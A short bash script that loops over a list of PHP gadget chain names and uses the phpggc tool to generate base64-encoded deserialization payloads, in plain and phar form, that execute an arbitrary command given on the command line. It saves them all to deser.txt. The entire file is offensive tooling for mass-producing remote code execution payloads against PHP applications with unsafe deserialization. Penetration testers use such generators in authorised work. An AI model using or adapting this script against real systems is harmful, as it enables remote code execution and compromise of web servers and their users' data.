#!/bin/bash

if [ $# -eq 0 ]; then
    echo "Usage: $0 <COMMAND_HERE>"
    exit 1
fi

COMMAND=$1
gadgets_file="phpgadgets.txt"

while read -r gadget; do
    php --define phar.readonly=0 phpggc/phpggc "$gadget" exec "$COMMAND" | base64 | tr -d "\n" | tee -a deser.txt
    echo | tee -a deser.txt
    php --define phar.readonly=0 phpggc/phpggc "$gadget" exec "$COMMAND" -p phar | base64 | tr -d "\n" | tee -a deser.txt
    echo | tee -a deser.txt
done < "$gadgets_file"